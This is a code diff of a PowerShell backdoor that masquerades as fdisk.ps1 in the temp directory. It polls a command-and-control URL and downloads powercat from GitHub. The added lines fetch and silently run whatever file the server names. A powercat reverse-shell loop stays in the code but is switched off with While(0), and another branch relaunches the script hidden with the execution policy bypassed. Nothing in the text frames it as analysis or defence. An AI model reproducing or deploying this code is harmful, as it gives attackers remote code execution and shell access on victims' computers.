@@ -35,12 +35,23 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 	}
 
 	# reverse shell Start-Process -ArgumentList -c
-    $server = 'http://1.nekocode.sinaapp.com/my_host'
+    $server = 'http://1.nekocode.sinaapp.com/bd'
 
     While(1) {
         Try {
-            $attacker_host = Invoke-RestMethod -Method Get -Uri $server
+            $info = Invoke-RestMethod -Method Get -Uri $server
             $strPowercat = (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+            
+            if($info.url -eq "") {
+            } else {
+                Import-Module BitsTransfer
+                Start-BitsTransfer $info.url ("$env:temp\"+$info.filename)
+
+                try {
+                    invoke-item ("$env:temp\"+$info.filename)
+                } Catch {
+                }
+            }
             Break
         } Catch {
         }
@@ -48,12 +59,12 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
         Start-Sleep -Seconds 3
     }
 
-    While(1){
+    While(0){
         Try {
-            start-job -ArgumentList $attacker_host,$strPowercat {
-                param($attacker_host,$strPowercat)
+            start-job -ArgumentList $info,$strPowercat {
+                param($info,$strPowercat)
                 IEX $strPowercat
-                powercat -c $attacker_host.host -p $attacker_host.port -ep
+                powercat -c $info.host -p $info.port -ep
             }
             get-job | wait-job
         } Catch {
@@ -61,6 +72,7 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 
         Start-Sleep -Seconds 3
     }
+    
 	
 } else {
 	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
